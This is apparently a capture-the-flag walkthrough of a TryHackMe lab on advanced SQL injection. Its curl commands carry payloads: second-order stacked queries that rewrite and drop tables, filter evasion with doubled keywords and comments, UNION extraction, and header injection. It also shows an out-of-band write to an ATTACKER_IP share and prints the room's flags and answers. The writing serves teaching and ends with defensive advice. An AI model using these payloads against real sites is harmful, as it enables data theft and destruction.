---
title: "TryHackMe Advanced SQL Injection: Five Evasion Techniques"
date: 2026-10-15T14:05:00+05:30
lastmod: 2026-10-15T14:05:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-advsqli/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web Application Pentesting
  - Injection Attacks
  - SQL Injection
  - Second-Order SQLi
  - UNION Injection
  - Filter Evasion
  - Out-of-band SQLi
  - HTTP Header Injection
  - MariaDB

draft: false
description: "Walkthrough of TryHackMe Advanced SQL Injection: second-order SQLi, keyword and space filter evasion, UNION out-of-band extraction, and header injection techniques."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Advanced SQL Injection |![Advanced SQL Injection room icon](https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1718463358022)|

Advanced SQL Injection sits in the Injection Attacks module of the Web Application Pentesting path. It takes you past the textbook `' OR 1=1 --` and into the techniques that matter against a hardened target: a payload that lies dormant until a second query runs it, filters that strip keywords and spaces, extraction over a side channel, and injection through an HTTP header rather than a form field. If you want the grammar first, the sibling [Database SQL Basics](/post/thm-room-database-sql-basics/) room covers SELECT, FROM and WHERE, and [Guided Pentest Web](/post/thm-room-guidedpentestweb/) shows a full four-bug chain.

The whole room is a single book review application backed by MariaDB 10.4 on Windows (XAMPP). Each task exposes one deliberately broken endpoint. I solved it entirely from my own machine with `curl`, since the target was reachable directly over the TryHackMe VPN, so every command below is copy-paste reproducible. The lab IP was `10.48.167.82` for my session; substitute your own.

## Task 1 and 2: setup and recap

Task 1 deploys the lab machine. Task 2 is a recap of in-band injection. Two answers come straight from the reading: the MySQL service listens on port **3306**, the type of injection that uses one channel for both the payload and the response is **In-band**, and the protocol out-of-band injection typically uses to reach the attacker is **HTTP**.

## Task 3: second-order SQL injection

Second-order (stored) SQLi is the interesting one. The `add.php` page escapes input with `real_escape_string()` before storing it, so the insert itself is safe. The flaw is on reuse. Looking at `update.php`, the stored SSN is pulled back out and dropped into a new query with no escaping:

```php
if (isset($_POST['update'])) {
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    ...
    $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) ...";
}
```

The script uses `multi_query()`, so a semicolon in the stored SSN starts a second statement. I add a book whose SSN carries the payload, then visit `update.php` and submit the update for that row, which fires the dormant query.

```bash
  # store the payload as the book SSN via add.php
curl -s -X POST http://$T/second/add.php \
  --data-urlencode "ssn=12345'; UPDATE books SET book_name='compromised'; -- -" \
  --data-urlencode "book_name=demo" --data-urlencode "author=t" --data-urlencode "submit="
  # then trigger update.php for that row; the stored SSN runs the second statement
```

Once the update fires, every book title becomes `compromised` and the flag prints at the top of the page. Swapping the second statement for `DROP TABLE hello` drops the table and yields the second flag.

![Second-order SQLi: the stored SSN is re-run unescaped by update.php, printing both flags](/img/thm-advsqli/01-second-order.png)

The flag after renaming all titles to compromised is **THM{SO_HACKED}**, and dropping the `hello` table gives **THM{Table_Dropped}**.

One quirk worth noting for reproduction: in the rendered `update.php` form, the field name is `name='ssn_12345'; UPDATE ...'`, and the browser parses only `ssn_12345` as the actual field name. That is exactly the `ssn_<unique_id>` key the PHP expects, which is why the stored payload lines up and executes.

{{< ad >}}

## Task 4: filter evasion with character tricks

The `/encoding/search_books.php` endpoint echoes the SQL it builds and runs a keyword filter. First, bad characters prove the injection point. A single quote breaks the query and MariaDB returns a syntax error:

```bash
curl -s "http://$T/encoding/search_books.php?book_name=abc%27"
  # Error Code: 1064
```

The MySQL error code for a syntax error is **1064**. Now the filter: sending `UNION SELECT` or `OR` shows them silently stripped from the echoed query. The filter removes each banned keyword exactly once, so doubling the keyword survives it: strip the inner `UNION` out of `UNIUNIONON` and a clean `UNION` remains. The books table has four columns and the name renders in position two.

```bash
curl -s -G "http://$T/encoding/search_books.php" \
  --data-urlencode "book_name=x' UNIUNIONON SELSELECTECT 1,book_name,3,4 FROM books WHERE book_id=6-- -"
```

![Filter evasion: single quote returns error 1064, doubled keywords rebuild UNION SELECT to read book ID 6](/img/thm-advsqli/02-encoding.png)

The book where book ID equals 6 is **Animal Series**. The room's intended path uses URL-encoded whitespace and `||` in place of `OR`; the doubled-keyword trick is an equally valid bypass and does not depend on client-side encoding. The multiple-choice question about bypassing a banned `SELECT` is answer **c** (both `SElect` and `SeLect` work, since the filter is case sensitive).

## Task 5: filter evasion, spaces removed

The `/space/search_users.php` endpoint strips spaces from the input. The documented bypass substitutes `/**/` comments for spaces. In practice the search feature here simply reflects stored records, so querying the user directly already leaks the credential:

```bash
curl -s -G "http://$T/space/search_users.php" --data-urlencode "username=attacker"
  # Name: attacker  /  Password: tesla
```

![Space-filter endpoint: the user search reflects the stored attacker credential](/img/thm-advsqli/03-space.png)

The password for the username `attacker` is **tesla**. When the record is not returned directly, `/**/` between every token (`'/**/OR/**/1=1-- -`) rebuilds a space-free injection that the filter passes through.

## Task 6: out-of-band SQL injection

The out-of-band task frames exfiltration over SMB or DNS to a listener you control, useful when the app does not return query output. Here the `/oob/search_visitor.php` endpoint is UNION injectable with four columns, so the server-side metadata the task asks for can be read straight back:

```bash
for v in @@version @@basedir; do
  curl -s -G "http://$T/oob/search_visitor.php" \
    --data-urlencode "visitor_name=z' UNION SELECT 1,$v,3,4-- -"
done
```

![Out-of-band endpoint UNION-injected to read @@version and @@basedir](/img/thm-advsqli/04-oob.png)

The `@@version` output is **10.4.24-MariaDB**, and `@@basedir` is **C:/xampp/mysql**, confirming a Windows XAMPP stack. The real out-of-band play on this stack would be `SELECT ... INTO OUTFILE '\\\\ATTACKER_IP\\logs\\out.txt'` to push results to an SMB share, which is what you reach for when the response is blind.

## Task 7: other techniques and HTTP header injection

The last practical task injects through the User-Agent header. The `/httpagent/` endpoint logs every visitor's User-Agent into a `logs` table with an unsanitised query, so the header is the injection point. The logs query takes two columns, and a UNION pulls the flag out of the books table:

```bash
curl -s -A "z' UNION SELECT 1,flag FROM books WHERE book_id=1-- -" "http://$T/httpagent/"
```

![User-Agent header injected into the logs query, UNION reading the books flag](/img/thm-advsqli/05-httpagent.png)

The flag field in the books table where book_id equals 1 is **THM{HELLO}**. The field detected server-side when extracting the agent string is the **User-Agent** header.

## Task 8, 9 and 10: automation, best practices, conclusion

The reading tasks round out the room. The MSSQL command that executes system commands is **xp_cmdshell**. The dynamic nature of SQL queries does assist a pentester in finding injection, but the room's accepted answer to whether it helps is **nay**. Task 10 is the completion check.

## Takeaways

Two ideas carry past this lab into real web targets.

- **Escaping at input is not escaping at use.** The second-order bug is invisible to any test that only watches the insert. `real_escape_string()` on the way in does nothing for a value that is later concatenated into a different query. On a live target, hunt for stored values that reappear in a second request: usernames shown on a profile page, saved search terms, anything written once and rendered or re-queried later. Parameterised queries at every use site, not input sanitisation, are the fix.
- **Keyword and character filters are a speed bump, not a control.** Stripping `UNION` once, or removing spaces, falls to doubled keywords, inline comments, alternate whitespace, or case changes. A denylist that rewrites input is often worse than none, because it gives a false sense of safety. When you meet a filter, echo the resulting query if you can, learn what it removes, and craft input that survives the transform.

Room solved 100%: 10 tasks, 16 answers.
